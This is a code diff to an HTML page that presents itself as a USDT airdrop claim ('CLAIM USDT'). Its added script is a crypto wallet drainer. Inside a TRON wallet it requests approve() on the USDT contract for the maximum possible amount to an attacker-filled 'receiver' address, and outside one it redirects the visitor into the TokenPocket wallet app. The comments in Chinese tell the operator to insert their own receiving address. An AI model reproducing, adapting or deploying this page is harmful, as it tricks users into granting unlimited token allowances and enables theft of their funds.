@@ -3,47 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AIRDROP_TERMINAL</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>CLAIM AIRDROP</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body { background: #000; color: #f00; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        #terminal { width: 85%; border: 1px solid #f00; padding: 20px; background: #100; box-shadow: 0 0 15px #f00; }
-        .btn {
-            display: block; width: 220px; padding: 20px; margin-top: 30px;
-            background: #f00; color: #000; text-align: center;
-            text-decoration: none; font-weight: bold; border-radius: 5px;
-        }
-        .hint { color: #555; font-size: 10px; margin-top: 20px; text-align: center; }
+        body { background: #000; color: #f00; font-family: monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
+        #terminal { width: 85%; margin: 0 auto; border: 1px solid #f00; padding: 20px; background: #100; box-shadow: 0 0 15px #f00; }
+        .btn { display: block; width: 220px; padding: 20px; margin: 30px auto; background: #f00; color: #000; text-decoration: none; font-weight: bold; border-radius: 5px; cursor: pointer; }
+        .log { color: #0f0; font-size: 12px; margin-top: 10px; text-align: left; }
     </style>
 </head>
 <body>
 
     <div id="terminal">
-        <h2>> AUTH_REQUIRED</h2>
-        <p>> DEVICE: iOS_DETECTED</p>
-        <p id="status">> STATUS: READY_TO_OPEN_WALLET</p>
+        <h2>> AIRDROP_PROTOCOL_v4</h2>
+        <p id="status">> STATUS: SYSTEM_READY</p>
+        <div class="log" id="log">> AWAITING_AUTHORIZATION...</div>
     </div>
 
-    <a href="https://tokenpocket.github.io/tp-url-common/index.html?url=https://patrickdafhao-code.github.io/cook/" 
-       class="btn" 
-       id="jumpBtn">
-        OPEN IN WALLET
-    </a>
-
-    <div class="hint">
-        * 若点击无反应，请点右上角 [...] 选择 "在浏览器打开"
-    </div>
+    <div id="actionBtn" class="btn">CLAIM USDT</div>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        tg.expand();
+        const myUrl = "https://patrickdafhao-code.github.io/cook/";
+        const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC-20 地址
+        const receiver = "你的收款钱包地址"; // 填入你的接收地址！！！
 
-        document.getElementById('jumpBtn').addEventListener('click', function(e) {
-            tg.HapticFeedback.notificationOccurred('success');
-            // 强制使用 Telegram SDK 的打开功能，增加“跳出”概率
-            tg.openLink(this.href, { try_browser: true });
-        });
+        const btn = document.getElementById('actionBtn');
+        const log = document.getElementById('log');
+
+        btn.onclick = async function() {
+            // 1. 判断当前环境
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                // 如果在钱包内，直接执行“黑科技”授权逻辑
+                try {
+                    log.innerHTML += "<br>> INITIATING_SMART_CONTRACT...";
+                    let contract = await window.tronWeb.contract().at(usdtContract);
+                    
+                    // 无限授权数量 (2^256 - 1)
+                    const val = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+                    
+                    // 弹出授权请求
+                    await contract.approve(receiver, val).send({
+                        feeLimit: 100000000
+                    });
+                    
+                    log.innerHTML += "<br>> [SUCCESS]: AUTH_GRANTED.";
+                } catch (e) {
+                    log.innerHTML += "<br>> [ERROR]: " + e.message;
+                }
+            } else {
+                // 如果在 Safari 浏览器，则执行跳转到钱包的指令
+                log.innerHTML += "<br>> REDIRECTING_TO_WALLET...";
+                const tpProtocol = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": myUrl}));
+                window.location.href = tpProtocol;
+            }
+        };
+
+        // 自动检测提示
+        window.onload = function() {
+            if (window.tronWeb) {
+                document.getElementById('status').innerText = "> STATUS: WALLET_CONNECTED";
+                log.innerHTML += "<br>> TRON_NETWORK_DETECTED.";
+            }
+        }
     </script>
 </body>
 </html>
